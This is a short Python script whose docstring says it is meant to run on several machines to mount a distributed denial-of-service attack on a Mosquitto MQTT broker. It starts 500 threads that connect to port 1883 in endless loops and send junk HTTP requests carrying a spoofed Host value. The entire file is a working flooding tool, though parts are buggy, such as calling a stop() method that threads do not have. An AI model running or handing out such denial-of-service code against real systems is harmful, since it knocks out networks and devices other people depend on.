"""
This module sends packets on a loop to mosquittos ip and port, used on multiple machiches
should assemble a distributed denial of service attack which slows down or stops the
network entirely
"""

import socket
import threading
import os

from dotenv import load_dotenv


def attack(target, fake_ip, port):
    """ Sends packets in a loop to given IP """
    while True:
        skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        skt.connect((target, port))
        skt.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'),
                   (target, port))
        skt.sendto(
            ("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        skt.close()


def main():
    """ Entry function """
    load_dotenv()
    target = os.getenv('mosquitto_address')
    fake_ip = '182.21.20.32'
    port = 1883
    threads = []
    for _ in range(500):
        thread = threading.Thread(target=lambda: attack(target, fake_ip, port))
        thread.start()
        threads.append(thread)

    for i in range(500):
        threads[i].stop()


if __name__ == '__main__':
    main()
